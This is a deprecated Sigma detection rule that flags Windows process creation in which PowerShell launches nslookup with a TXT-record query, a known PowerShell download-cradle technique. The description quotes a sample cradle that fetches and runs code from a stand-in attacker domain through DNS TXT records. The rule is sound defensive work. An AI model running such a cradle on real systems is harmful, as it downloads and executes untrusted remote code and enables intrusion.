title: Nslookup PwSh Download Cradle
id: 79c252ba-3759-a153-7242-9f3de6ec7ba4
related:
    - id: 72671447-4352-4413-bb91-b85569687135
      type: derived
status: deprecated
description: This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
references:
    - https://twitter.com/alh4zr3d/status/1566489367232651264
author: Zach Mathis (@yamatosecurity)
date: 2022-09-06
modified: 2022-12-14
tags:
    - attack.command-and-control
    - attack.t1105
    - attack.t1071.004
logsource:
    category: process_creation
    product: windows
detection:
    process_creation:
        EventID: 4688
        Channel: Security
    selection:
        CommandLine|contains: '=txt '
        ParentProcessName|endswith: \powershell.exe
        NewProcessName|contains: nslookup
    condition: process_creation and selection
level: medium
ruletype: Sigma
